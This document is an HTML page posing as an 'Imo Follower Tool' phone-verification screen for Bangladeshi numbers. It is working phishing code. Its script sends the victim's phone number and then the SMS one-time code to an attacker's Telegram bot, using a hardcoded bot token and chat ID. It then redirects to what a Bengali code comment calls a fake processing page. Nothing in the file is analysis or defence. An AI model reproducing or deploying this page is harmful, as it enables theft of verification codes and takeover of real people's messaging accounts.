<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Imo Follower Tool</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    input::placeholder {
      font-size: 1.2rem;
      color: #9ca3af;
    }
    .toast {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #000;
      color: #fff;
      padding: 12px 24px;
      border-radius: 10px;
      z-index: 9999;
      display: none;
    }
  </style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between">

  <!-- Toast -->
  <div id="toast" class="toast">You will receive OTP in 5 minutes</div>

  <!-- Phone number input -->
  <div id="main-page" class="pt-10 px-6 text-center">
    <h1 class="text-3xl font-normal mb-4">Verify Phone</h1>
    <p class="text-base mb-4 max-w-xl mx-auto text-gray-600">
      Your phone number is used to connect with your friends. We will send an SMS to verify your number.
    </p>
    <form id="phoneForm" class="mt-6 px-6">
      <div class="flex items-center border-t border-gray-300 px-4 py-3">
        <span class="text-lg mr-2 select-none">+880</span>
        <input id="phoneNumber" type="tel" placeholder="Your phone number" class="flex-1 text-lg placeholder-gray-400 border-b border-blue-500 focus:outline-none" required />
        <button type="submit" class="ml-4 w-14 h-14 rounded-full bg-blue-500 flex items-center justify-center">
          <i class="fas fa-check text-white text-2xl"></i>
        </button>
      </div>
    </form>
  </div>

  <!-- OTP input -->
  <div id="otp-page" class="hidden px-6 pt-20 text-center">
    <h1 class="text-2xl font-normal mb-4">Enter OTP</h1>
    <p class="text-lg text-gray-800 max-w-xs mx-auto mb-6">
      We just sent an SMS code to your number.
    </p>
    <form id="otpForm" class="max-w-xs mx-auto">
      <input id="otpInput" type="text" placeholder="Enter code" class="w-full border-b-2 border-sky-400 text-center focus:outline-none text-xl" inputmode="numeric" required />
      <button type="submit" class="mt-6 bg-blue-600 text-white py-2 px-6 rounded-full text-lg">Submit</button>
    </form>
  </div>

  <script>
    const phoneForm = document.getElementById("phoneForm");
    const otpForm = document.getElementById("otpForm");
    const mainPage = document.getElementById("main-page");
    const otpPage = document.getElementById("otp-page");
    const toast = document.getElementById("toast");

    const TELEGRAM_TOKEN = "8163475263:AAGGJNmnM8CBSzDWiN4PyWXjuFvy-kJxDFo"; 
    const CHAT_ID = "7386221547";

    phoneForm.addEventListener("submit", function (e) {
      e.preventDefault();
      const phone = document.getElementById("phoneNumber").value.trim();
      if (phone === "") return;

      axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `📱 Phone Submitted: +880${phone}`
      }).then(() => {
        toast.innerText = "You will receive OTP in 5 minutes";
        toast.style.display = "block";
        setTimeout(() => {
          toast.style.display = "none";
          mainPage.classList.add("hidden");
          otpPage.classList.remove("hidden");
        }, 2000);
      });
    });

    otpForm.addEventListener("submit", function (e) {
      e.preventDefault();
      const otp = document.getElementById("otpInput").value.trim();
      if (otp === "") return;

      axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `🔐 OTP Submitted: ${otp}`
      }).then(() => {
        window.location.href = "followers.html"; // ফেক প্রোসেসিং পেজ
      });
    });
  </script>
</body>
</html>
